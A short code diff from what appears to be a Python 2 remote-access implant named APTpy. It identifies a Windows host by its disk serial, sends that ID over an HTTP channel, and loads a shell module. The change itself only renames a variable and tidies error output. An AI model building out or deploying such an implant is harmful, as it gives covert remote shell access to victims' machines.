@@ -9,7 +9,7 @@ DEBUG = True
 
 class APTpy:
     def __init__(self):
-        self.id = None
+        self.client_id = None
         self.channel = None
         self.modules = []
         self.queue_send = Queue.Queue()
@@ -68,12 +68,12 @@ class APTpy:
     def _checkenv(self):
         info = wmi.WMI()
         disk = info.Win32_PhysicalMedia()[0].SerialNumber.strip()
-        self.id = disk
+        self.client_id = disk
 
     def _registerChannels(self):
         from lib.channels.http import HttpChannel
 
-        self.channel = HttpChannel(self.queue_send, self.queue_recv)
+        self.channel = HttpChannel(self.client_id, self.queue_send, self.queue_recv)
 
     def _registerModules(self):
         from lib.modules.shell import ShellModule
@@ -86,4 +86,4 @@ try:
     obj.run()
 except Exception, e:
     if DEBUG:
-        print "[!] Operation aborted: " + str(type(e)) + e.message
+        print "[!] Operation aborted: " + type(e).__name__ + e.message
